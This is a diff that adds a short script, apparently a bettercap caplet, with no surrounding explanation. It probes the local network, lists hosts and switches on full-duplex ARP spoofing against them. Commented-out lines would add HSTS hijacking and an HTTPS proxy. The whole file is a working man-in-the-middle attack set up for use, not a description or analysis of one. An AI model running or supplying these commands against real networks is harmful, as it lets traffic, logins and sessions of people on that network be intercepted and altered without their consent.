@@ -1,0 +1,15 @@
+net.recon on
+sleep 1
+set arp.spoof.fullduplex true
+#set arp.spoof.targets 10.0.0.1, 10.0.0.74
+net.probe on
+sleep 4
+net.show
+sleep 3
+set arp.spoof.internal true
+arp.spoof on
+sleep 2
+sleep 2
+#hstshijack/hstshijack
+#sleep 3
+#https.proxy on
